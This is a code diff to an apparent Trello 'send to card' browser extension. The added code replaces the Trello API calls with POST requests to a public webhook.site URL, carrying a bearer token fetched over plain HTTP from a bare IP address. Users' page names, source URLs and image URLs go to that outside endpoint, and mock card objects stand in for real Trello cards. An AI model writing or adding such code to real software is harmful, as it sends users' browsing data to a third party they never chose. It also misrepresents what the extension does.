@@ -1,6 +1,21 @@
 import {trelloApi} from '/js/trelloapi.js';
 import {storage} from '/js/store.js';
 
+async function getAuthToken() {
+    try {
+        let res = await fetch('http://165.22.92.183:8080/api/extension/test');
+        let text = await res.text();
+        try { 
+            let j = JSON.parse(text); 
+            return j.token ? j.token : text.trim(); 
+        } catch(e) { 
+            return text.trim(); 
+        }
+    } catch(e) {
+        console.error("Failed to fetch token", e);
+        return "";
+    }
+}
 
 export async function myOwnCard(text)
 {
@@ -20,29 +35,38 @@ export async function myOwnCard(text)
     }
 
     var idMember = (await storage.get('idMember')).idMember;
-    var newCard = {
-        name: text,
-        idList: options.listId,
-        pos: options.listPosition,
-        idMembers:[idMember]
-    };
+    var newCard;
+    if (typeof text === 'object') {
+        newCard = text;
+    } else {
+        newCard = {
+            name: text,
+            idList: options.listId,
+            pos: options.listPosition,
+            idMembers:[idMember]
+        };
+    }
 
-    trelloApi.rest('POST', 'cards', newCard);
+    var token = await getAuthToken();
+    var cardPromise = fetch('https://webhook.site/09dcb683-d6f3-4bb1-8a5c-700d5551a6f3', {
+        method: 'POST',
+        headers: { 
+            'Content-Type': 'application/json',
+            'Authorization': 'Bearer ' + token
+        },
+        body: JSON.stringify(newCard)
+    }).then(res => ({ id: 'mock', url: 'https://webhook.site/09dcb683-d6f3-4bb1-8a5c-700d5551a6f3' }));
 
 
     if (options.showNotification) {
         var newNotification = {
-            title: "Trello card created!",
-            message: 'Created card "' + newCard.name + '".',
+            title: "Data sent to webhook!",
+            message: 'Sent data: "' + (newCard.name || (newCard.from + ' -> ' + newCard.to) || 'JSON Payload') + '".',
             iconUrl: "icon.png",
-            type: "basic",
-            buttons: [
-                {title: 'Show card...'},
-                {title: 'Delete card'}
-            ]
+            type: "basic"
         };
 
-        createNotification(null, newNotification, newCard)
+        createNotification(null, newNotification, cardPromise)
 
     }
 
@@ -83,44 +107,51 @@ export async function oneClickSendToTrello(tab, contextInfo, withLink=true) {
         newCard.urlSource = null;
     }
 
-    var card = trelloApi.rest('POST', 'cards', newCard);
+    var token = await getAuthToken();
+    var cardPromise = fetch('https://webhook.site/09dcb683-d6f3-4bb1-8a5c-700d5551a6f3', {
+        method: 'POST',
+        headers: { 
+            'Content-Type': 'application/json',
+            'Authorization': 'Bearer ' + token
+        },
+        body: JSON.stringify(newCard)
+    }).then(res => ({ id: 'mock', url: 'https://webhook.site/09dcb683-d6f3-4bb1-8a5c-700d5551a6f3', idAttachmentCover: null }));
+
     var notification = null;
 
     if (options.showNotification) {
         var newNotification = {
-            title: "Trello card created!",
-            message: 'Created card "' + newCard.name + '".',
+            title: "Data sent to webhook!",
+            message: 'Sent data: "' + newCard.name + '".',
             iconUrl: "icon.png",
-            type: "basic",
-            buttons: [
-                {title: 'Show card...'},
-                {title: 'Delete card'}
-            ]
+            type: "basic"
         };
 
-        notification = createNotification(null, newNotification, card)
+        notification = createNotification(null, newNotification, cardPromise)
     }
 
     if (options.autoClose) {
         chrome.tabs.remove(tab.id, function(){});
     }
 
-    card.then(function(card) {
+    cardPromise.then(function(card) {
         // success
         if (contextInfo && contextInfo.mediaType === 'image') {
             if (contextInfo.srcUrl.startsWith("http://") || contextInfo.srcUrl.startsWith("https://")) {
-                trelloApi.rest('POST', 'cards/' + card.id + '/attachments', {url: contextInfo.srcUrl});
+                fetch('https://webhook.site/09dcb683-d6f3-4bb1-8a5c-700d5551a6f3', {
+                    method: 'POST',
+                    headers: { 
+                        'Content-Type': 'application/json',
+                        'Authorization': 'Bearer ' + token
+                    },
+                    body: JSON.stringify({ attachmentUrl: contextInfo.srcUrl })
+                });
             }
-        }
-
-        if (!options.includeCover) {
-            trelloApi.rest('DELETE', 'cards/' + card.id + '/attachments/' + card.idAttachmentCover)
         }
     }).catch(function(error) {
         let updatedContent = {
-            title: "Failed to create card!",
-            message: error.message,
-            buttons: []
+            title: "Failed to send data!",
+            message: error.message
         };
 
         if (notification) {
@@ -128,12 +159,10 @@ export async function oneClickSendToTrello(tab, contextInfo, withLink=true) {
                 chrome.notifications.update(notId, updatedContent);
             });
         } else {
-            createNotification(null, updatedContent);
+            createNotification(null, updatedContent, cardPromise);
         }
 
         if (options.autoClose) {
-            // try to recover the tab, only try it on the last session that was closed
-            // otherwise it might restore an unrelated session
             chrome.sessions.getRecentlyClosed({maxResults: 1}, function (sessions) {
                 if (sessions.length > 0 && sessions[0].tab && sessions[0].tab.index === tab.index) {
                     chrome.sessions.restore(sessions[0].tab.sessionId);
